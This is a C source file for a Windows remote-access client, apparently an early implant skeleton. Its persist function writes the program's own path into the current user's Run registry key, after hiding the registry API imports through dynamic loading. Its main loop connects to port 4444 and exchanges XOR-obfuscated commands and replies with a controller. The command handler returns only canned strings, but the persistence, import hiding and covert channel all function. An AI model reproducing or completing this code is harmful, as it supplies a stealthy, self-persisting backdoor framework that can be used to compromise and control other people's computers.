#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Winsock library for networking

typedef LONG(WINAPI *RegOpenKeyA_t)(HKEY, LPCSTR, PHKEY);
typedef LONG(WINAPI *RegSetValueExA_t)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
typedef LONG(WINAPI *RegCloseKey_t)(HKEY);

// XOR encryption/decryption
void xor_encrypt_decrypt(char *data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Dynamically loaded registry persistence
void persist() {
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    if (!hAdvapi32) {
        printf("Failed to load advapi32.dll\n");
        return;
    }

    RegOpenKeyA_t RegOpenKeyA = (RegOpenKeyA_t)GetProcAddress(hAdvapi32, "RegOpenKeyA");
    RegSetValueExA_t RegSetValueExA = (RegSetValueExA_t)GetProcAddress(hAdvapi32, "RegSetValueExA");
    RegCloseKey_t RegCloseKey = (RegCloseKey_t)GetProcAddress(hAdvapi32, "RegCloseKey");

    if (!RegOpenKeyA || !RegSetValueExA || !RegCloseKey) {
        printf("Failed to resolve functions\n");
        FreeLibrary(hAdvapi32);
        return;
    }

    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "MyClient", 0, REG_SZ, (const BYTE *)path, strlen(path) + 1);
            RegCloseKey(hKey);
            printf("Persistence added to registry.\n");
        } else {
            printf("Failed to open registry key.\n");
        }
    } else {
        printf("Failed to retrieve module path.\n");
    }

    FreeLibrary(hAdvapi32);
}

// Command execution
void execute_command(char *command, char *response) {
    if (strcmp(command, "systeminfo") == 0) {
        snprintf(response, 1024, "OS: Windows\nCPU: Intel\nMemory: 8GB");
    } else if (strcmp(command, "hello") == 0) {
        snprintf(response, 1024, "Hello from the client!");
    } else {
        snprintf(response, 1024, "Unknown command.");
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server_addr;
    char buffer[1024], response[1024];
    const char XOR_KEY = 0xAA;

    persist(); // Add persistence

    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connected to server.\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        if (recv(sock, buffer, sizeof(buffer), 0) <= 0) {
            printf("Connection closed or error receiving data.\n");
            break;
        }

        xor_encrypt_decrypt(buffer, strlen(buffer), XOR_KEY);

        if (strcmp(buffer, "exit") == 0) {
            printf("Exiting...\n");
            break;
        }

        printf("Command received: %s\n", buffer);
        memset(response, 0, sizeof(response));
        execute_command(buffer, response);

        xor_encrypt_decrypt(response, strlen(response), XOR_KEY);
        if (send(sock, response, strlen(response), 0) <= 0) {
            printf("Error sending data.\n");
            break;
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
